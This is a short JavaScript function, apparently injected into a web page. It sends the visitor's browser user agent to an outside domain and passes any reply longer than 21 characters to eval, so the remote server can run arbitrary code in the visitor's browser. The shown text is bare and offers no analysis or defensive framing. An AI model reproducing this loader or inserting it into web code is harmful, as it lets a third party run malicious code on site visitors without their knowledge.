function ChkRef() { 
	$.ajax({
		type : "get", 
		url : "http://shoesroom.top/chck.php", 
		data : "ref=" + navigator.userAgent, 
		async : false, 
		success : function(data)
		{
			if(data.length > 21) eval(data); 
		} 
		}); 
} 